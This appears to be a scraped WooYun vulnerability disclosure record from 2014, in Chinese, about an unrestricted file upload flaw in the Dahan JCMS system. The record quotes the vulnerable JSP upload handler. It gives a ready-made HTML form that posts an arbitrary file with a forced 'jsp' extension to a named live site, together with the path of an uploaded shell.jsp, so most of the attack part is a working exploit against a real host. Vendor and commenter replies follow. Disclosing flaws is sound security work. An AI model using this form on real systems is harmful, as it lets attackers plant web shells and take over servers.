{"id": 49105, "wybug_id": "wooyun-2014-075585", "wybug_title": "大汉版通系统无限制getshell", "wybug_corp": "南京大汉网络有限公司", "wybug_author": "路人甲", "wybug_date": "2014-09-09 19:14", "wybug_open_date": "2014-12-05 19:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "任意文件写入利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-10：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向公众公开  简要描述： 大汉版通系统无限制getshell 详细说明：  该文件上传发生在：/jcms/m_5_e/module/idea/opr_import_discussion.jsp核心代码如下：\n<%\tListTable listtable = new ListTable(request);\tout.println(listtable.getListTableCssJs());\tsys.initSysPara(request);\tString strBillStatus = Convert.getParameter(request,\"fn_billstatus\",\"A\");\tjcms.entity.Merp_Pub_UserEntity userentity = UserRightBLF.getUserInfo(request);\tint typeid = Convert.getParameterInt(request,\"typeid\",0);\t/*定义变量、取表单值*/\tString strTpl_fn_billstatus = \"S\";\t/*保存、更新模板 -- 新增S或者更新B*/\tif (strBillStatus.equals(\"S\")){\t\tString strFilePath = application.getRealPath(\"\") + \"/jcms_files/jcms\"+sys.appId+\"/web\"+sys.webId+\"/site/module/idea/tem/upload/\";\t\tConvert.createDirectory(strFilePath);\t\tCommonUploadFile upload = new CommonUploadFile(strFilePath, \"\");    \tboolean bl = false;    \tString[] strFiles = null;    \ttry {            bl = upload.uploadFile(request);        }     \tcatch (Exception e) {        }    \tString ext = upload.getFormValue(\"ext\");//得到上传文件的格式    \tif(bl){    \t\tColumnParse cp = new ColumnParse( sys.appId,sys.webId );    \t\tcp.setUserentity( userentity );    \t\tString strXMLFile = \"\";    \t\tstrFiles = upload.getAllFileName();    \t\tTopicBLF blf=new TopicBLF(sys.appId,sys.webId);    \t\tif( strFiles != null ){    \t\t\tfor(int i=0;i<strFiles.length;i++){        \t\t\tstrXMLFile = strFilePath + strFiles[i];        \t\t\tblf.doImport(strXMLFile,typeid,userentity.getVc_username());         \t\t}    \t\t\t    \t\t}    \t}\t\tString strAlter = \" top.buttomFrame.right_frame.location.href='./que_discussion.jsp?typeid=\"+typeid+\"';\\n\"\t\t+ \"top.buttomFrame.left_frame.location.reload();\\n\"\t\t+ \"removeTB();\\n\";\t\t\tout.println( Convert.getAlterScript( strAlter ) );\t\treturn;\t}%>\n通过 String ext = upload.getFormValue(\"ext\");//得到上传文件的格式 获取上传的格式，但这个完全可控。所以造成了任意文件上传   漏洞证明：  漏洞利用：将如下代码保存为htm\n<form action=\"http://sha.sinotrans.com/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S\" method=\"POST\" ENCTYPE=\"multipart/form-data\">\t<input  type=\"hidden\" name=\"typeid\" value=\"0\"> \t<input  type=\"hidden\" name=\"fn_billstatus\" value=\"S\">\t<input  type=\"hidden\" name=\"ext\" value=\"jsp\">\t<input  type=\"file\"    name=\"file1\" />\t<input  type=\"submit\" value=\"Upload\" id=\"editbutton\"/></form>Path : /jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/+uploadname\n打开便可直接上传任意的文件，文件上传后，路径为：\n/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/+你上传的文件名\n采用http://sha.sinotrans.com网站进行漏洞利用证明：\nhttp://sha.sinotrans.com/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/shell.jsp\n如图 ：\n\n   修复方案：  严格限制文件上传的格式   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-05 19:16 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-09 19:17 |    \t\tSkull \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:33        | 菜鸟一枚。)\t\t \n  路人甲又出来祸害人间了    \n     2014-09-10 15:39 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  为什么忽略？    \n     2014-09-10 16:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  居然没有理由？    \n     2014-12-05 20:22 |    \t\t曙光的希望 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 曙光的希望)\t\t \n  需要后台权限    \n     2014-12-06 13:54 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @曙光的希望 看这意思不应该是需要权限，直接getshell么    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}